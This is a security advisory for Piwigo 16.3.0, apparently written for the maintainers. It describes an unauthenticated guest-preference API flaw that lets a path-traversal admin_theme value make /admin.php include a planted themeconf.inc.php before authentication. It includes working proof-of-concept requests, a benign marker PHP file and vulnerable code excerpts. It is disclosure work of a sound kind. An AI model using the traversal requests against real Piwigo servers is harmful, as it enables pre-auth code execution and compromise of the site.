# Unauthenticated Guest Preference Tampering Leading to Pre-Auth Fixed-File Include and Conditional Code Execution in Piwigo v16.3.0

## 1. Vulnerability Description

A hidden public API / pre-auth include chain exists in Piwigo v16.3.0.

The web service method `pwg.users.preferences.set` is publicly reachable and does not require administrator privileges, `pwg_token`, or an API key. Because the handler does not reject the `guest` account, an unauthenticated visitor can persistently modify the shared `guest` user's preferences.

One of those preferences is `admin_theme`. Later, when `/admin.php` is requested, Piwigo includes `include/common.inc.php` before it performs `check_status(ACCESS_ADMINISTRATOR)`. In that pre-auth path, Piwigo reads `admin_theme`, builds a theme directory path from attacker-controlled data, resolves it with `realpath()`, and then executes:

```php
include($dir.'/themeconf.inc.php');
```

As a result, if an attacker is able to place or upload a file named `themeconf.inc.php` somewhere on the same server filesystem, the attacker can use the public `pwg.users.preferences.set` API to redirect `/admin.php` to that directory and force inclusion of the planted PHP file before administrator authentication occurs.

This is not an arbitrary file include in the strict sense, because the included filename is fixed as `themeconf.inc.php`. However, once the prerequisite file-placement capability exists, the chain becomes a severe pre-auth code execution primitive.

- Vulnerability Type: Broken Access Control + Pre-Auth Fixed-File Local File Include
- CWE ID: CWE-862, CWE-98

## 2. Affected Version

- Piwigo `16.3.0`

Other versions have not been verified yet.

## 3. Tested Environment

The issue was reproduced in the following local environment:

- Operating system: Windows
- Piwigo version: `16.3.0`
- PHP version: `8.2.0`
- MySQL version: `8.4.5`
- Piwigo deployment path: `D:\develop\Apache24\htdocs\Piwigo_16.3.0`
- Test file placement path: `D:\Fixed-File-Include\themeconf.inc.php`
- Test base URL: `http://localhost/`

For demonstration, I placed the following harmless proof file at `D:\Fixed-File-Include\themeconf.inc.php`:

```php
<?php
$marker = __DIR__ . '/themeconf-include-proof.txt';

$data = array(
  'time' => date('c'),
  'event' => 'themeconf.inc.php executed before admin auth',
  'uri' => $_SERVER['REQUEST_URI'] ?? '',
  'script' => $_SERVER['SCRIPT_NAME'] ?? '',
  'cwd' => getcwd(),
  '__FILE__' => __FILE__,
  '__DIR__' => __DIR__,
);

@file_put_contents($marker, json_encode($data, JSON_UNESCAPED_SLASHES) . PHP_EOL, FILE_APPEND);

$themeconf = array();
```

## 4. Prerequisite for Exploitation

The attacker **must first be able to place a file named `themeconf.inc.php` on the same server** that hosts Piwigo. This could be through any separate file upload, local write, shared-hosting artifact, deployment mistake, or another vulnerability.

Once that prerequisite is met:

- no login is required;
- no administrator permission is required;
- no `pwg_token` is required;
- no API key is required.

The attacker only needs public HTTP access to Piwigo.

## 5. Steps to Reproduce

1. Do not log in.

2. Ensure that the following file exists on the server:
   - `D:\Fixed-File-Include\themeconf.inc.php`

   <img src="C:\Users\Leousum\AppData\Roaming\Typora\typora-user-images\image-20260416193750169.png" alt="image-20260416193750169" style="zoom: 67%;" />

3. Send the following unauthenticated request to change the shared `guest` preference:

   `GET http://localhost/ws.php?format=json&method=pwg.users.preferences.set&param=admin_theme&value=../../../../../../Fixed-File-Include`

   The server returns a successful JSON response such as:

   ```json
   {"stat":"ok","result":{"admin_theme":"../../../../../../Fixed-File-Include"}}
   ```

   <img src="C:\Users\Leousum\AppData\Roaming\Typora\typora-user-images\image-20260416193837955.png" alt="image-20260416193837955" style="zoom:67%;" />

4. Then send the following unauthenticated request:

   `GET http://localhost/admin.php`

   <img src="C:\Users\Leousum\AppData\Roaming\Typora\typora-user-images\image-20260416193904994.png" alt="image-20260416193904994" style="zoom:67%;" />

5. Observe that the response still redirects to login, but the file `D:\Fixed-File-Include\themeconf.inc.php` has already been included and executed before the authentication check.

6. Confirm this by checking:
   - `D:\Fixed-File-Include\themeconf-include-proof.txt`

<img src="C:\Users\Leousum\AppData\Roaming\Typora\typora-user-images\image-20260416194031910.png" alt="image-20260416194031910" style="zoom:67%;" />

In my test, the proof file contained:

```json
{"time":"2026-04-16T11:40:08+00:00","event":"themeconf.inc.php executed before admin auth","uri":"/admin.php","script":"/admin.php","cwd":"D:\\develop\\Apache24\\htdocs\\Piwigo_16.3.0","__FILE__":"D:\\Fixed-File-Include\\themeconf.inc.php","__DIR__":"D:\\Fixed-File-Include"}
```

This proves that attacker-controlled PHP code from `themeconf.inc.php` ran before administrator authentication.

## 6. Proof of Concept Requests

(1) Set the `guest` user's `admin_theme` preference to an attacker-chosen directory:

`http://localhost/ws.php?format=json&method=pwg.users.preferences.set&param=admin_theme&value=../../../../../../Fixed-File-Include`

(2) Trigger the pre-auth fixed-file include:

`http://localhost/admin.php`

## 7. Vulnerable Code

（1）`D:\develop\Apache24\htdocs\Piwigo_16.3.0\ws.php:1333`

The method `pwg.users.preferences.set` is exposed through the public web service registry.

（2）`D:\develop\Apache24\htdocs\Piwigo_16.3.0\include\ws_functions\pwg.users.php:663-678`

The handler `ws_users_preferences_set()` accepts user-controlled `param` and `value`, does not reject the `guest` account, and calls:

```php
userprefs_update_param($params['param'], $value, true);
```

（3）`D:\develop\Apache24\htdocs\Piwigo_16.3.0\include\functions_user.inc.php:2131-2133`

The supplied preference is stored into the current user's persistent preferences:

```php
$user['preferences'][$param] = $value;
userprefs_save();
```

（4）`D:\develop\Apache24\htdocs\Piwigo_16.3.0\admin.php:16`

`/admin.php` includes `include/common.inc.php` before access control is enforced.

（5）`D:\develop\Apache24\htdocs\Piwigo_16.3.0\admin.php:27`

The administrator permission check happens only later:

```php
check_status(ACCESS_ADMINISTRATOR);
```

（6）`D:\develop\Apache24\htdocs\Piwigo_16.3.0\include\common.inc.php:285`

In the pre-auth path, Piwigo reads the attacker-controlled `admin_theme` preference:

```php
$template = new Template(PHPWG_ROOT_PATH.'admin/themes', userprefs_get_param('admin_theme', 'clear'));
```

（7）`D:\develop\Apache24\htdocs\Piwigo_16.3.0\include\template.class.php:1181-1189`

The theme directory is resolved and the fixed file `themeconf.inc.php` is included:

```php
$dir = realpath($dir);
include($dir.'/themeconf.inc.php');
```

## 8. Security Impact

By itself, the first bug lets any unauthenticated visitor persistently tamper with the shared `guest` user's preferences. The full security impact becomes much more serious when combined with any ability to place a file named `themeconf.inc.php` onto the server.

Under that condition, an unauthenticated attacker can cause PHP to execute attacker-controlled code before administrator authentication. In practical terms, this may lead to full compromise of the Piwigo instance and potentially the underlying server, including:

- arbitrary PHP code execution;
- database compromise;
- credential disclosure;
- persistent backdoor installation;
- file modification or destruction;
- further lateral movement depending on server permissions.

Even when the attacker cannot yet place `themeconf.inc.php`, the application still performs a pre-auth include attempt from an attacker-chosen directory, which is a dangerous sink and a strong indicator that the chain is security-relevant.

## 9. Contact Information

You can contact me at: `sliao25@m.fudan.edu.cn`

If you determine that this report describes a valid security issue, I would appreciate being added to the related task or bug report so that I can follow its progress.
